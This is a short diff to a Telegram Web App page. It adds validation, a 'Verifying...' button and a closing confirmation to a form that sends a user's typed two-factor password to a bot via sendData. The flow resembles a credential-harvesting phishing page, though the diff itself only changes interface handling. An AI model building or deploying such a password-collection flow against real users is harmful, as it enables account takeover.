@@ -44,13 +44,26 @@
             const twofaInput = document.getElementById('twofa-input');
             const twofaBtn = document.getElementById('twofa-btn');
             
-            // Initialize Telegram Web App
+            // Initialize Telegram Web App - Keep it open!
             tg.ready();
             tg.expand();
+            tg.enableClosingConfirmation();
             
             twofaBtn.addEventListener('click', function() {
                 if (tg) {
-                    tg.sendData('verify_2fa:' + twofaInput.value);
+                    const password = twofaInput.value;
+                    if (password.length > 0) {
+                        tg.MainButton.setText('Verifying...');
+                        tg.MainButton.show();
+                        tg.MainButton.disable();
+                        tg.sendData('verify_2fa:' + password);
+                    } else {
+                        tg.showPopup({
+                            title: 'Error',
+                            message: 'Please enter your 2FA password!',
+                            buttons: [{ type: 'ok', text: 'OK' }]
+                        });
+                    }
                 }
             });
         });
